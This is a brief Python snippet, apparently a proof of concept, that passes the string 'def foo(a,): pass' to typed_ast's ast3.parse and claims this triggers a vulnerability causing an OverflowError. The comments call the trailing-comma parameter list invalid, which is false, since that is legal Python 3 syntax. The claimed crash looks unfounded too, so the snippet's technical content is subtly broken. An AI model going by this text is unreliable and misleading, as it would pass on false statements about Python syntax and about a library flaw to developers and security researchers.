# Import the typed_ast library
from typed_ast import ast3

# Define a malicious source code string
# This string has an invalid argument list with a trailing comma
source = "def foo(a,): pass"

# Try to parse the source code using the ast3.parse() function
# This will trigger the vulnerability and cause an OverflowError
node = ast3.parse(source)